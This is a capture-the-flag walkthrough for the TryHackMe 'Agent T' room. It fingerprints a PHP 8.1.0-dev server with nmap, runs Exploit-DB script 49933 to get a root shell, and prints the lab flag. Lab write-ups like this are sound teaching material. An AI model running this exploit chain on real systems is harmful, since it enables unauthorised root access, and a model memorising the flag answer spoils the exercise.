# Agent T Walkthrough
### Link
- https://tryhackme.com/room/agentt
---
### Recon
```
sudo nmap -sV -sC [IP]
```
**Namp scan result**
```
Host is up (0.39s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```

Now we can try to access it through http --> http://[IP]

We have an access to a **admin** dashboard. After navigating from this page, we can notice that we cannot access others features.

One important information we caught from the **nmap scan** is the version of the Php 
```
PHP cli server 5.5 or later (PHP 8.1.0-dev)
```
### Find an exploit

We can check **exploitdb** and we are lucky beacause we have this [exploitdb](https://www.exploit-db.com/exploits/49933)

### Use the exploit

```
python3 49933.py 
Enter the full host url:
http://10.10.78.93/

Interactive shell is opened on http://10.10.78.93/ 
Can't acces tty; job crontol turned off.
$ id
uid=0(root) gid=0(root) groups=0(root)

```

### Find  the flag

```
$ ls /
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat /flag.txt
flag{4127d0530abf16d6d23973e3df8dbecb}
```

**Question**
#### What is the flag?
**Answer** 
#### flag{4127d0530abf16d6d23973e3df8dbecb}
